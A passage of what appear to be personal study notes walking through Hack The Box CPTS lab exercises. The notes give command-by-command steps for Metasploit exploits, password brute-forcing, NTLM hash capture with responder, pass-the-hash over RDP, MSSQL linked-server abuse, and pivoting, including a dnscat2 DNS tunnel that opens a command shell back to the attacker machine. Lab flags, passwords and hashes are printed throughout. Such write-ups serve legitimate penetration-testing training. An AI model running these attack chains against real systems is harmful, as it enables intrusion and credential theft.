HTB{MSF-W1nD0w5-3xPL01t4t10n}</p> <p>Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.</p> <pre><code>sudo nmap -sC -sV $ip -Pn \n</code></pre> <pre><code># From results you have\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)\n|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)\n|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)\n8081/tcp open  http    Jetty 9.4.12.v20180830\n| http-title: Apache Druid\n|_Requested resource was http://10.129.203.52:8081/unified-console.html\n|_http-server-header: Jetty(9.4.12.v20180830)\n8082/tcp open  http    Jetty 9.4.12.v20180830\n|_http-title: Site doesn't have a title.\n|_http-server-header: Jetty(9.4.12.v20180830)\n8083/tcp open  http    Jetty 9.4.12.v20180830\n|_http-server-header: Jetty(9.4.12.v20180830)\n|_http-title: Site doesn't have a title.\n8888/tcp open  http    Jetty 9.4.12.v20180830\n|_http-server-header: Jetty(9.4.12.v20180830)\n| http-title: Apache Druid\n|_Requested resource was http://10.129.203.52:8888/unified-console.html\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <pre><code># Now\nmsfconsole -q\nsearch apache druid\nuse linux/http/apache_druid_js_rce\n# set RHOSTS, LHOST, etc and run it to obtain a meterpreter\n\nshell\npwd\ncd ..\ncat flag.txt\n</code></pre> <p>Results: HTB{MSF_Expl01t4t10n}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#msf-sessions","title":"MSF Sessions","text":"<p>The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?</p> <p>Results: elFinder</p> <p>Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?</p> <pre><code>msfconsole -q\nworkspace -a lala\ndb_nmap -sC -sV $ip\nsearch elfinder\nuse linux/http/elfinder_archive_cmd_injection\n# SET RHOSTS, SET LHOST...\nrun\ngetuid\n</code></pre> <p>Results: www-data</p> <p>The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.</p> <pre><code># In the previous session, run\nsudo -V\n</code></pre> <pre><code>Sudo version 1.8.31\nSudoers policy plugin version 1.8.31\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.31\n</code></pre> <p>After searching in google, we find CVE-2021-3156:</p> <pre><code>search CVE-2021-3156\noptions\n# SET SESSION 2, SET LHOST, SET RHOSTS\nrun\nshell\ncat /root/flag.txt\n</code></pre> <p>Results: HTB{5e55ion5_4r3_sw33t}</p> <p>Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?</p> <pre><code>msfconsole -q\ndb_nmap -sC -sV -p- $ip\n</code></pre> <p>From response pay attention to port 5000:</p> <pre><code>Nmap: PORT      STATE SERVICE       VERSION\n[*] Nmap: 135/tcp   open  msrpc         Microsoft Windows RPC\n[*] Nmap: 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n[*] Nmap: 445/tcp   open  microsoft-ds?\n[*] Nmap: 3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n[*] Nmap: |_ssl-date: 2024-09-23T19:38:10+00:00; 0s from scanner time.\n[*] Nmap: | ssl-cert: Subject: commonName=WIN-51BJ97BCIPV\n[*] Nmap: | Not valid before: 2024-09-22T19:35:32\n[*] Nmap: |_Not valid after:  2025-03-24T19:35:32\n[*] Nmap: | rdp-ntlm-info:\n[*] Nmap: |   Target_Name: WIN-51BJ97BCIPV\n[*] Nmap: |   NetBIOS_Domain_Name: WIN-51BJ97BCIPV\n[*] Nmap: |   NetBIOS_Computer_Name: WIN-51BJ97BCIPV\n[*] Nmap: |   DNS_Domain_Name: WIN-51BJ97BCIPV\n[*] Nmap: |   DNS_Computer_Name: WIN-51BJ97BCIPV\n[*] Nmap: |   Product_Version: 10.0.17763\n[*] Nmap: |_  System_Time: 2024-09-23T19:38:02+00:00\n[*] Nmap: 5000/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n[*] Nmap: | http-methods:\n[*] Nmap: |_  Potentially risky methods: TRACE\n[*] Nmap: |_http-server-header: Microsoft-IIS/10.0\n[*] Nmap: |_http-title: FortiLogger | Log and Report System\n[*] Nmap: 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n[*] Nmap: |_http-title: Not Found\n[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0\n[*] Nmap: 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0\n[*] Nmap: |_http-title: Not Found\n[*] Nmap: 49664/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: 49665/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: 49666/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: 49667/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: 49668/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: 49669/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: 49670/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: 49671/tcp open  msrpc         Microsoft Windows RPC\n[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n[*] Nmap: Host script results:\n[*] Nmap: | smb2-time:\n[*] Nmap: |   date: 2024-09-23T19:38:06\n[*] Nmap: |_  start_date: N/A\n[*] Nmap: | smb2-security-mode:\n[*] Nmap: |   3:1:1:\n[*] Nmap: |_    Message signing enabled but not required\n[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n</code></pre> <p>After visiting $ip:5000 you can see the Fortilogger service. </p> <pre><code>search fortilogger\nuse exploit/windows/http/fortilogger_arbitrary_fileupload\n# SET LHOST, RHOSTS...\nrun \ngetuid\n</code></pre> <p>Results: NT AUTHORITY\\SYSTEM</p> <p>Retrieve the NTLM password hash for the \"htb-student\" user. Submit the hash as the answer.</p> <pre><code>lsa_dump_sam\n</code></pre> <pre><code>... CUT ...\nRID  : 000003ea (1002)\nUser : htb-student\n  Hash NTLM: cf3a5525ee9414229e66279623ed5c58\n... CUT ...\n</code></pre> <p>Results: cf3a5525ee9414229e66279623ed5c58</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#password-attacks","title":"Password Attacks","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#attacking-common-services","title":"Attacking Common Services","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#ftp_1","title":"FTP","text":"<p>What port is the FTP service running on?</p> <pre><code>sudo nmap -sC -sV $ip -Pn -p-\n</code></pre> <p>Results: 2121</p> <p>What username is available for the FTP server?</p> <pre><code># Footprint the service and check out that anonymous user is enabled. Login into the ftp service and download the userlist and password list. After that...\n\n# Two ways:\nmedusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121\nhydra -L users.list  -P pws.list ftp://$ip:2121 \n</code></pre> <p>Results:  robin</p> <p>Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.</p> <pre><code>ssh robin@$ip\ncat flag.txt\n</code></pre> <p>Results: HTB{ATT4CK1NG_F7P_53RV1C3}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#smb_1","title":"SMB","text":"<p>What is the name of the shared folder with READ permissions?</p> <pre><code>smbmap -H $ip\n</code></pre> <p>Results: GGJ</p> <p>What is the password for the username \"jason\"?</p> <pre><code>sudo nmap -sC -sV $ip -Pn\n# Results 22,53, 139,445,2121\n\nftp $ip 2121\n# Enter anonymous and anonymous\n\n# Download files\nmget *.list\n\n# Checksmb services\nsmbmap -H //\nsmbclient //$ip/GGJ -N\nsmbclient //$ip/GGJ -N -r\n\n# However, downloading the id_rsa file is not possible due to permissions. \nsmbmap -H  $ip --download GGJ/id_rsa  //NOT WORKING \n\n# We will download from resources pwd.list and launch a brute for attack \ncrackmapexec smb $ip -u jason -p pws.list  -d ATTCSVC-LINUX\n</code></pre> <p>Results: 34c8zuNBo91!@28Bszh</p> <p>Login as the user \"jason\" via SSH and find the flag.txt file. Submit the contents as your answer.</p> <pre><code># Log in as jason\nsmbclient  //$ip/GGJ -U jason\n#Enter password\nget id_rsa\nquit\n\nchmod 600 id_rsa\nssh -i id_rsa jason@$ip\ncat flag.txt\n</code></pre> <p>Results: HTB{SMB_4TT4CKS_2349872359}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#sql-databases","title":"SQL Databases","text":"<p>Authenticate to\u00a0$ip\u00a0with user \"htbdbuser\" and password \"MSSQLAccess01!\"</p> <p>What is the password for the \"mssqlsvc\" user?</p> <pre><code># Connect to the db using mssqlclient impacket\nmssqlclient.py -p 1433 htbdbuser@$ip\n# Enter creds when prompted\n\n# Whoami\nselect user_name();\n\n# List users:\nSELECT name FROM master..syslogins\n# The one we are looking for is not present.\n\n# We will try to capture MSSQL Service Hash by using\u00a0`xp_dirtree`\u00a0undocumented stored procedures.\n# In our attacker machine open a new terminal and set a responder listener\nsudo responder -I tun0\n\n# In the already connected mssql command line: \nEXEC master..xp_dirtree '\\\\$ipAttacker\\share'\n\n# The responder listener will print:\nNTLMv2-SSP Hash     : mssqlsvc::WIN-02:5b55e0dc6b4e012dn\n# Let's save it to a file\necho \"mssqlsvc::WIN-02:5b55e0dc6b4e012d:9061B752E27B9DC08B778088A813DDF6:0101000000000000801A85C76927DB01E0A642B53DA7BF6000000000020008004A00420059004F0001001E00570049004E002D0037003500460059004F0055004F00540052004F00360004003400570049004E002D0037003500460059004F0055004F00540052004F0036002E004A00420059004F002E004C004F00430041004C00030014004A00420059004F002E004C004F00430041004C00050014004A00420059004F002E004C004F00430041004C0007000800801A85C76927DB0106000400020000000800300030000000000000000000000000300000ABE564474E572C0FDA65F14FE47C49910CF6D5E2D84E98065E4910B32B2B9D850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000\" &gt; hash.txt\n\n# And now... crack it with John the ripper\n john -w=/usr/share/wordlists/rockyou.txt hash.txt\n ```\n\nResults: princess1\n\n\n**Enumerate the \"flagDB\" database and submit a flag as your answer.**\n</code></pre>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#we-know-that-user-mssqlsvcprincess1-is-part-of-the-windows-authentication-so-we-login-into-the-service-with-those-creds","title":"We know that user mssqlsvc:princess1 is part of the windows authentication, so we login into the service with those creds:","text":"<p>mssqlclient.py -p 1433 mssqlsvc@$ip -windows-auth</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#and-enter-the-password","title":"and enter the password","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#list-databases","title":"List databases","text":"<p>SELECT name FROM master.dbo.sysdatabases</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#lets-see-tables-in-flagdb","title":"Let's see tables in flagDB","text":"<p>SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#ok-we-need-to-select-the-db-before-asking-for-its-contents","title":"Ok, we need to select the DB before asking for its contents","text":"<p>USE flagDB</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#now-print-the-content-of-the-table","title":"Now print the content of the table:","text":"<p>SELECT * FROM tb_flag <pre><code>Results: HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}\n\n### RDP\nRDP to\u00a0\u00a0with user \"htb-rdp\" and password \"HTBRocks!\"\n\n**What is the name of the file that was left on the Desktop? (Format example: filename.txt).**\n</code></pre> xfreerdp /d:$domain] /u:$user /p:$pass /v:$ip <pre><code>Results: pentest-notes.txt\n\n\n**Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**\n\nReading the file pentest-notes.txt\n</code></pre> We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.</p> <p>User: Administrator Hash: 0E14B9D6330BF16C30B1924111104824 <pre><code>Which means that RDP connection with pass the hash needs some troubleshooting. \n*Restricted Admin Mode*, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa` with the value of 0. It can be done using the following command:\n\n```powershell\nreg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre></p> <p>Results: DisableRestrictedAdmin</p> <p>Connect via RDP with the Administrator account and submit the flag.txt as you answer.</p> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p> <pre><code>xfreerdp /d:$domain /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /v:$ip \n</code></pre> <p>Results: <code>HTB{RDP_P4$$_Th3_H4$#}</code></p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#dns_1","title":"DNS","text":"<p>Find all available DNS records for the \"inlanefreight.htb\" domain on the target name server and submit the flag found as a DNS record as the answer.</p> <pre><code># Enumerate subdomains\ndnsenum --dnsserver 10.129.86.251 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb\n# you will get the following subdomains:\n# ns.inlanefreight.htb, control.inlanefreight.htb, helpdesk.inlanefreight.htb\n\n\n# Install subbrute\ngit clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1\n\n# Access the tool\ncd subbrute\n\n# Configure resolver file \necho \"ns.inlanefreight.htb\" &gt; ./resolvers.txt\n\n# Enumerate subdomains with subbrute\npython3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt\n# You will get the following subdomains:\n# hr.inlanefreight.htb\n\n# Attempt a zone transfer\n dig AXFR @ns.inlanefreight.htb hr.inlanefreight.htb \n</code></pre> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; AXFR @ns.inlanefreight.htb hr.inlanefreight.htb\n; (1 server found)\n;; global options: +cmd\nhr.inlanefreight.htb.   604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\nhr.inlanefreight.htb.   604800  IN  TXT \"HTB{LUIHNFAS2871SJK1259991}\"\nhr.inlanefreight.htb.   604800  IN  NS  ns.inlanefreight.htb.\nns.hr.inlanefreight.htb. 604800 IN  A   127.0.0.1\nhr.inlanefreight.htb.   604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 40 msec\n;; SERVER: 10.129.86.251#53(ns.inlanefreight.htb) (TCP)\n;; WHEN: Fri Nov 01 14:34:47 EDT 2024\n;; XFR size: 5 records (messages 1, bytes 230)\n</code></pre> <p>Results: <code>HTB{LUIHNFAS2871SJK1259991}</code></p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#smtp_1","title":"SMTP","text":"<p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p> <pre><code>smtp-user-enum -M RCPT -U users.list  -D inlanefreight.htb -t $ip\n</code></pre> <p>Results: marlin</p> <p>Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.</p> <pre><code>hydra -l marlin@inlanefreight.htb -P passwords.list -f $ip pop3\n# It will return the password: poohbear\n\n# Now connect to POP server\ntelnet $ip 110\nUSER marlin@inlanefreight.htb\nPASS poohbear\nSTATS\nLIST\nRETR 1\n</code></pre> <p>Results: <code>HTB{w34k_p4$$w0rd}</code></p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skills-assessment_3","title":"Skills Assessment","text":"<p>We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: - <code>HTB{...}</code>. Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.</p> <p>EASY. You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.</p> <pre><code>sudo nmap -sC -sV -Pn $ip\necho \"$ip    inlanefreight.htb\" | sudo tee -a /etc/host\n\n# Download the users.list from HTB or you will go bananas\nsmtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t $ip \n# As a result you get fiona@inlanefreight.htb exists\n\n# Password attack\nhydra -l fiona@inlanefreight.htb -P passwords.list -t 64 -f $ip smtp\n# Result: [25][smtp] host: 10.129.179.42   login: fiona@inlanefreight.htb   password: 987654321\n\n# Now we login into the service mysql\nmysql -u fiona -p\"987654321\" -h $ip\n\nSELECT LOAD_FILE(\"C:/Users/Administrator/Desktop/flag.txt\");\n</code></pre> <p>Results: <code>HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}</code></p> <p>The second server is an internal server (within the\u00a0<code>inlanefreight.htb</code>\u00a0domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.</p> <p>MEDIUM: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.</p> <pre><code>sudo nmap -sC -sV -Pn -p- $ip\n\nftp $ip 30021\n# Enter as creds anonymous:anonymous\n# dir\n# cd simon\n# mget *.txt\n# quit\n\nssh simon@$ip\n# Enter password 8Ns8j1b!23hs4921smHzwn\n\ncat flag.txt\n</code></pre> <p>Results: HTB{1qay2wsx3EDC4rfv_M3D1UM}</p> <p>Hard. The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know. </p> <p>What file can you retrieve that belongs to the user \"simon\"? (Format: filename.txt)</p> <pre><code>smbclient -L \\\\$ip -U simon \n\nsmbclient  \\\\\\\\$ip\\\\Home -U simon -N\ncd IT\ncd Simon\n</code></pre> <p>Results: random.txt</p> <p>Enumerate the target and find a password for the user Fiona. What is her password?</p> <pre><code>smbclient -L \\\\$ip -U simon \n\nsmbclient  \\\\\\\\$ip\\\\Home -U simon -N\ncd IT\ncd Fiona\nget creds.txt\nquit\n\ncat creds.txt\n#Try with all creds and see that \"48Ns72!bns74@S84NNNSl\" works for:\nsmbclient  \\\\\\\\$ip\\\\Home -U fiona \n</code></pre> <p>Results: <code>48Ns72!bns74@S84NNNSl</code></p> <p>Once logged in, what other user can we compromise to gain admin privileges?</p> <p>Results: John</p> <p>Submit the contents of the flag.txt file on the Administrator Desktop.</p> <pre><code>rdesktop -u Fiona -p '48Ns72!bns74@S84NNNSl' $ip\n\n# Open Powershell\nsqlcmd\n\n# List databases\n1&gt; SELECT name FROM master.dbo.sysdatabases\n2&gt; go\n# Enumerate DB and nothing interesting comes out\n\n# Verify if our current user has the sysadmin role:\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\ngo\n#  value 0 indicates no sysadmin role, value 1 is sysadmin role. Fiona has no sysadminrole\n\n\n# Identify Users that we Can Impersonate\nSELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' \ngo\n\n# As a result we can see john. Let's impersonate him and verify if hjohn has sysadmin role\nEXECUTE AS LOGIN = 'john';  \nSELECT SYSTEM_USER;  \nSELECT IS_SRVROLEMEMBER('sysadmin');  \ngo\n\n# No sysadmin role for john\n\n\n# Identify linked Servers in MSSQL\nSELECT srvname, isremote FROM sysservers\ngo\n\n# As response we have\n# WINSRV02\\SQLEXPRESS                                         # LOCAL.TEST.LINKED.SRV                                                                                                     \n# We can read files from that connection in local\nexecute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv]; \n</code></pre> <p>Results: <code>HTB{46u$!n9_l!nk3d_$3rv3r$}</code> </p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#pivoting-tunneling-and-port-forwarding","title":"Pivoting, Tunneling, and Port Forwarding","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#introduction","title":"Introduction","text":"<p>Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?</p> <p>Results: eth0</p> <p>Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?</p> <p>Results: tun0</p> <p>Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?</p> <p>Results: 178.62.64.1</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#choosing-the-dig-site-starting-our-tunnels","title":"Choosing The Dig Site &amp; Starting Our Tunnels","text":"<p>SSH to\u00a0$ip\u00a0with user \"ubuntu\" and password \"HTB_@cademy_stdnt!\" You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)</p> <pre><code>ssh ubuntu@$ip -D 1234\nip a\n</code></pre> <p>Results: 3</p> <p>Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.</p> <pre><code># Configure proxychains.\nsudo nano /etc/proxychains4.conf\n# Adding the last line: socks5 127.0.0.1 1234\n\n# Set the dynamic port:\nssh ubuntu@$ip -D 1234 \n# Scan the NIC in the connection\nip a\n\n# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's\nproxychains nmap -v -sT -Pn 172.16.5.1-255\n\n# In the results you will see 172.16.5.19. Now run a nmap on that ip\nproxychains nmap -v -sT -Pn 172.16.5.19\n# Open ports: \n# 53/tcp   open  domain\n# 80/tcp   open  http\n# 88/tcp   open  kerberos-sec\n# 135/tcp  open  msrpc\n# 139/tcp  open  netbios-ssn\n# 389/tcp  open  ldap\n# 445/tcp  open  microsoft-ds\n# 464/tcp  open  kpasswd5\n# 593/tcp  open  http-rpc-epmap\n# 636/tcp  open  ldapssl\n# 3268/tcp open  globalcatLDAP\n# 3269/tcp open  globalcatLDAPssl\n# 3389/tcp open  ms-wbt-server\n\n# In a different terminal\nexport user=\"victor\"\nexport pass=\"pass@123\" \nproxychains xfreerdp  /u:$user /p:$pass /v:172.16.5.19\n# And you will get a RDP connection. Open the flag.txt\n</code></pre> <p>Results: N1c3Piv0t</p> <p>SSH to\u00a0$ip\u00a0with user \"ubuntu\" and password \"HTB_@cademy_stdnt!\" Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)</p> <pre><code># Configure proxychains.\nsudo nano /etc/proxychains4.conf\n# Adding the last line: socks5 127.0.0.1 1234\n\n# Set the dynamic port:\nssh ubuntu@$ip -D 1234 \n# Scan the NIC in the connection\nip a\n</code></pre> <p>Results: 172.16.5.129</p> <p>What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)</p> <p>Results: 0.0.0.0</p> <p>What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)</p> <pre><code># Configure proxychains.\nsudo nano /etc/proxychains4.conf\n# Adding the last line: socks5 127.0.0.1 1234\n\n# Set the dynamic port:\nssh ubuntu@$ip -D 1234 \n# Scan the NIC in the connection\nip a\n\n# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's\nproxychains nmap -v -sT -Pn 172.16.5.1-255\n\n# In the results you will see 172.16.5.19. Now run a nmap on that ip\n# Open ports: \n# 53/tcp   open  domain\n# 80/tcp   open  http\n# 88/tcp   open  kerberos-sec\n# 135/tcp  open  msrpc\n# 139/tcp  open  netbios-ssn\n# 389/tcp  open  ldap\n# 445/tcp  open  microsoft-ds\n# 464/tcp  open  kpasswd5\n# 593/tcp  open  http-rpc-epmap\n# 636/tcp  open  ldapssl\n# 3268/tcp open  globalcatLDAP\n# 3269/tcp open  globalcatLDAPssl\n# 3389/tcp open  ms-wbt-server\n</code></pre> <p>Results: 172.16.5.19,172.16.5.129</p> <p>Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)</p> <p>Results: 172.16.5.0/255.255.254.0 via 10.129.202.64</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#playing-pong-with-socat","title":"Playing Pong with Socat","text":"<p>SSH tunneling is required with Socat. True or False?</p> <p>Results: False</p> <p>What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)</p> <p>Results: windows/x64/meterpreter/bind_tcp</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#pivoting-around-obstacles","title":"Pivoting Around Obstacles","text":"<p>From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.</p> <p>Results: Attack Host</p> <p>From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.</p> <p>Results: Pivot Host</p> <p>SSH to\u00a0$ip\u00a0with user \"ubuntu\" and password \"HTB_@cademy_stdnt!\". Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.</p> <pre><code># Kali, terminal 1, copy the rpivot folder and run the server \nscp -r rpivot ubuntu@$UbuntuIP:/home/ubuntu/\ncd rpivot/ \npython2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0\n\n# Kali, terminal 2, connect to the ubuntu machine and run the rpivot client\nssh ubuntu@$ip\ncd rpivot/\npython2.7 client.py --server-ip $KaliIP --server-port 9999\n\n# Kali, terminal 3, edit proxychains4.conf file and add the line ' sock4 127.0.0.1 9050' at the last line\nsudo nano /etc/proxychains4.conf  \n\n# Kali, terminal 3, connect to the internal web server:\nproxychains firefox-esr $ipWebServer\n</code></pre> <p>Results: I_L0v3_Pr0xy_Ch@ins</p> <p>RDP to\u00a0$ip \u00a0with user \"htb-student\" and password \"HTB_@cademy_stdnt!\". Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the \"VendorContacts.txt\" file located in the \"Approved Vendors\" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)</p> <pre><code># From kali, terminal 1, connect to the windows machine\nxfreerdp  /u:\"htb-student\" /p:\"HTB_@cademy_stdnt\\!\" /v:$ipWindows\n\n# Run Powershell as Administrator and execute:\nnetsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1Windows connectport=3389 connectaddress=$IpInterface2Windows\n\n# Make sure the connection is saved\nnetsh.exe interface portproxy show v4tov4\n\n# From kali, terminal 2, connect to the Target:\nxfreerdp  /u:victor /p:pass@123 /v:$IpInterface1Windows:8080\n\n# Browse to the file and capture the flag\n</code></pre> <p>Results: Jim Flipflop</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#branching-out-our-tunn","title":"Branching Out Our Tunn","text":"<p>RDP to\u00a010.129.42.198\u00a0(ACADEMY-PIVOTING-WIN10PIV)\u00a0with user \"htb-student\" and password \"HTB_@cademy_stdnt!\". Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\\Users\\htb-student\\Documents\\flag.txt as the answer.</p> <pre><code># In the kali attacker machine with ip $ip:\n##################################\n# Install the DNScat server\ngit clone https://github.com/iagox86/dnscat2.git\n\ncd dnscat2/server/\nsudo gem install bundler\nsudo bundle install\n\n# Launch the server\nsudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache\n\n# See the response after launching the server. The dns server will generate a secret that we will use from the victim machine to connect\n\n# Now, we need the client connection. As our targetted machine is Windows we download the powershell client dnscat2 to our kali\ngit clone https://github.com/lukebaggett/dnscat2-powershell.git\n\n# Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques. In this case I initiated a http server from the folder where dnscat2.ps1 was\npython -m http.server 8000\n\n\n# Additionally, I opened a RDP connection with the windows machine:\nxfreerdp  /u:\"htb-student\" /p:\"HTB_@cademy_stdnt\\!\" /v:$ip\n\n\n###########################################\n## From the windows machine. Open a powershell\n################\n# Download the dnscat2 powershell client:\ncurl http://$ipAttackerMachine:8000/dnscat2.ps1 &gt; dnscat2.ps1\n\n# Install\nImport-Module .\\dnscat2.ps1\n\n# Initiate the connection\nStart-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd \n# $secret is obtained from the server launched in the kali machne.\n\n###########################################\n## From the kali Attacker machine\n################\n# We will receive the message:\n# New window created: 1\n# Session 1 Security: ENCRYPTED AND VERIFIED!\n(the security depends on the strength of your pre-shared secret!)\n\n# Enter the session\nwindow -i 1\n\n# Retrieve the flag\ntype C:\\Users\\htb-student\\Documents\\flag.txt\n</code></pre> <p>Results: AC@tinth3Tunnel</p> <p>SSH to $ip with user \"ubuntu\" and password \"HTB_@cademy_stdnt!\" Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\\Users\\victor\\Documents\\flag.txt as the answer.</p> <pre><code>#########\n# In the attacker machine\n#######\ngit clone https://github.com/jpillora/chisel.git\n\ncd chisel\ngo build\n\n\n# It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection.\n# You can run\u00a0`go build -ldflags=\"-s -w\"`\u00a0and reduce it to 7.5MB (where\u00a0`-s`\u00a0is 